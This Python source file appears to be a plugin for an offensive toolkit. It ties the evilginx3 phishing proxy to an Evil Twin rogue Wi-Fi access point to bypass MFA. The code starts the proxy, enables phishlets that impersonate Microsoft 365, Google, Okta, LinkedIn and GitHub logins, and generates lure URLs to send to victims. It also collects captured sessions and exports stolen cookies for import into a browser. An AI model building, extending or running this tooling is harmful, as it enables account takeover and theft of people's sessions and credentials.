"""
Evilginx AiTM Plugin - Adversary-in-the-Middle for MFA Bypass.

This plugin integrates evilginx3 with MoMo's Evil Twin infrastructure
to create a complete phishing attack chain:

1. Evil Twin creates fake AP and attracts victims
2. Captive portal redirects to evilginx proxy
3. Evilginx transparently proxies to real site
4. Victim authenticates (including 2FA)
5. Evilginx captures session cookies
6. Attacker uses cookies to access victim's account

This defeats ALL forms of MFA because the victim authenticates
on the REAL site - evilginx just captures the resulting session.
"""

from __future__ import annotations

import asyncio
import logging
from datetime import UTC, datetime
from typing import Any

logger = logging.getLogger(__name__)

# Plugin metadata
__plugin_name__ = "evilginx_aitm"
__version__ = "1.0.0"
__author__ = "MoMo Team"
__description__ = "Adversary-in-the-Middle proxy for MFA bypass"
__requires__ = ["eviltwin"]  # Depends on Evil Twin plugin

# Module-level state
_manager = None
_session_manager = None
_phishlet_manager = None
_config = {}
_stats = {
    "sessions_captured": 0,
    "lures_created": 0,
    "phishlets_active": 0,
    "attacks_started": 0,
    "attacks_successful": 0,
}


def on_load(config: dict[str, Any]) -> None:
    """Called when plugin loads."""
    global _config
    _config = config.get("evilginx", {})
    logger.info("Evilginx AiTM plugin loaded")


def on_ready(agent: Any) -> None:
    """Called when agent is ready."""
    global _manager, _session_manager, _phishlet_manager
    
    try:
        from momo.infrastructure.evilginx import (
            EvilginxConfig,
            EvilginxManager,
            MockEvilginxManager,
            PhishletManager,
            SessionManager,
        )
        
        # Build config
        evilginx_config = EvilginxConfig(
            binary_path=_config.get("binary_path", "/usr/local/bin/evilginx"),
            external_ip=_config.get("external_ip", "0.0.0.0"),
            https_port=_config.get("https_port", 443),
            redirect_domain=_config.get("redirect_domain", "login.example.com"),
        )
        
        # Use mock if binary not found (for testing)
        if _config.get("mock", False):
            _manager = MockEvilginxManager(evilginx_config)
        else:
            _manager = EvilginxManager(evilginx_config)
        
        _session_manager = SessionManager()
        _phishlet_manager = PhishletManager()
        
        logger.info(
            "Evilginx AiTM ready - %d phishlets available",
            len(_phishlet_manager.list_phishlet_names())
        )
        
    except ImportError as e:
        logger.warning("Evilginx dependencies not available: %s", e)


async def start_evilginx() -> bool:
    """Start evilginx proxy server."""
    global _stats
    
    if not _manager:
        logger.error("Evilginx manager not initialized")
        return False
    
    success = await _manager.start()
    if success:
        _stats["attacks_started"] += 1
        logger.info("Evilginx proxy started")
    
    return success


async def stop_evilginx() -> None:
    """Stop evilginx proxy server."""
    if _manager:
        await _manager.stop()
        logger.info("Evilginx proxy stopped")


async def enable_phishlet(name: str, hostname: str | None = None) -> bool:
    """
    Enable a phishlet for attacks.
    
    Args:
        name: Phishlet name (microsoft365, google, okta, linkedin, github)
        hostname: Custom hostname for phishing domain
    
    Example:
        await enable_phishlet("microsoft365")
        await enable_phishlet("google", hostname="login.secure-mail.com")
    """
    global _stats
    
    if not _manager:
        logger.error("Evilginx manager not initialized")
        return False
    
    success = await _manager.enable_phishlet(name, hostname)
    if success:
        _stats["phishlets_active"] += 1
    
    return success


async def create_lure(
    phishlet: str,
    redirect_url: str = "https://www.google.com",
) -> dict[str, Any] | None:
    """
    Create a phishing lure URL.
    
    Args:
        phishlet: Enabled phishlet name
        redirect_url: Where to redirect after credential capture
    
    Returns:
        Lure information including phishing URL
    
    Example:
        lure = await create_lure("microsoft365", redirect_url="https://office.com")
        print(f"Send to victim: {lure['url']}")
    """
    global _stats
    
    if not _manager:
        logger.error("Evilginx manager not initialized")
        return None
    
    lure = await _manager.create_lure(phishlet, redirect_url=redirect_url)
    if lure:
        _stats["lures_created"] += 1
        return {
            "id": lure.id,
            "phishlet": lure.phishlet,
            "url": lure.url,
            "redirect_url": lure.redirect_url,
            "created_at": lure.created_at.isoformat(),
        }
    
    return None


async def get_sessions() -> list[dict[str, Any]]:
    """Get all captured sessions."""
    if not _session_manager:
        return []
    
    sessions = _session_manager.get_all_sessions()
    return [s.to_dict() for s in sessions]


async def get_valid_sessions() -> list[dict[str, Any]]:
    """Get only valid (non-expired) sessions."""
    if not _session_manager:
        return []
    
    sessions = _session_manager.get_valid_sessions()
    return [s.to_dict() for s in sessions]


async def export_session(session_id: str, format: str = "json") -> str | None:
    """
    Export session cookies for browser import.
    
    Args:
        session_id: Session ID
        format: Export format (json, curl, netscape, raw)
    
    Returns:
        Exported cookie data
    """
    if not _session_manager:
        return None
    
    return _session_manager.export_session_cookies(session_id, format)


def list_phishlets() -> list[str]:
    """List available phishlets."""
    if not _phishlet_manager:
        return []
    return _phishlet_manager.list_phishlet_names()


def get_phishlet_info(name: str) -> dict[str, Any] | None:
    """Get detailed info about a phishlet."""
    if not _phishlet_manager:
        return None
    
    phishlet = _phishlet_manager.get_phishlet(name)
    if phishlet:
        return {
            "name": phishlet.name,
            "author": phishlet.author,
            "description": phishlet.description,
            "login_url": phishlet.login_url,
            "enabled": phishlet.enabled,
            "proxy_hosts": phishlet.proxy_hosts,
        }
    return None


def get_metrics() -> dict[str, Any]:
    """Get Prometheus-compatible metrics."""
    metrics = {
        "momo_evilginx_sessions_total": _stats["sessions_captured"],
        "momo_evilginx_lures_total": _stats["lures_created"],
        "momo_evilginx_phishlets_active": _stats["phishlets_active"],
        "momo_evilginx_attacks_total": _stats["attacks_started"],
    }
    
    if _manager:
        metrics.update(_manager.get_metrics())
    
    return metrics


def get_stats() -> dict[str, Any]:
    """Get detailed statistics."""
    stats = _stats.copy()
    
    if _manager:
        stats["manager"] = _manager.get_stats()
    
    if _session_manager:
        stats["sessions"] = _session_manager.get_stats()
    
    if _phishlet_manager:
        stats["phishlets"] = _phishlet_manager.get_stats()
    
    return stats


def on_unload() -> None:
    """Called when plugin unloads."""
    global _manager, _session_manager, _phishlet_manager
    
    if _manager and _manager.is_running:
        # Can't await in sync context, log warning
        logger.warning("Evilginx still running on unload - will be orphaned")
    
    _manager = None
    _session_manager = None
    _phishlet_manager = None
    
    logger.info("Evilginx AiTM plugin unloaded")

